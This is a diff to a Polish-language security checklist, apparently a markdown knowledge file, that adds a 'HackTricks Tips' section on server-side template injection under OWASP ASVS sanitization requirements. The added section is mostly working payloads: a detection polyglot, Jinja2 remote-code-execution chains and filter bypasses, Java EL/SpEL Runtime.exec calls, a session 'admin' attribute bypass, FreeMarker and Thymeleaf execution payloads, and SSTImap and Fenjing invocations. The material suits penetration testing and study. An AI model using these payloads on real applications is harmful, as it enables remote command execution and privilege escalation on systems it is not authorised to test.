@@ -154,3 +154,53 @@ Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas 
 |---|---|---|
 | V1.3.7 | Sanitization | Verify that the application protects against template injection attacks by not allowing templates to be built based on untrusted input. Where there is no alternative, any untrusted input being included dynamically during template creation must be sanitized or strictly validated. |
 | V1.3.5 | Sanitization | Verify that the application sanitizes or disables user-supplied scriptable or expression template language content, such as Markdown, CSS or XSL stylesheets, BBCode, or similar. |
+
+
+---
+
+## HackTricks Tips
+
+### Detection
+
+Polyglot: `${{<%[%'"}}%\` — błędy lub brakujące znaki potwierdzają SSTI. Math: `{{7*7}}`, `${7*7}`, `<%= 7/0 %>`
+
+### Jinja2 (Python/Flask) — RCE
+
+**Subclass loop (bez zgadywania indexu):**
+```python
+{% for x in ().__class__.__base__.__subclasses__() %}
+  {% if "warning" in x.__name__ %}
+    {{x()._module.__builtins__['__import__']('os').popen("id").read()}}
+  {%endif%}
+{% endfor %}
+```
+
+**Via `__globals__`:**
+```
+{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("id").read() }}
+```
+
+**Filter bypass (bez cudzysłowów/underscores):**
+- `request|attr(request.args.c)` z `?c=__class__`
+- Hex: `(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]`
+- `{%with a=...|attr('popen')('id')|attr('read')()%}{%print(a)%}{%endwith%}` (bez `{{`, `.`, `[]`)
+
+### Java EL / SpEL
+
+```java
+T(java.lang.Runtime).getRuntime().exec('id')
+// Bypass getClass:
+${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('id')")}
+// Session bypass:
+${pageContext.request.getSession().setAttribute("admin", true)}
+```
+
+### FreeMarker / Thymeleaf
+
+- **FreeMarker**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
+- **Thymeleaf**: `[[${T(java.lang.Runtime).getRuntime().exec('id')}]]` lub `__${...}__` (preprocessing)
+
+### Narzędzia
+
+- **SSTImap**: `python3 sstimap.py -u "https://target/?name=John" -s`
+- **Fenjing**: WAF-bypass focused, interactive console
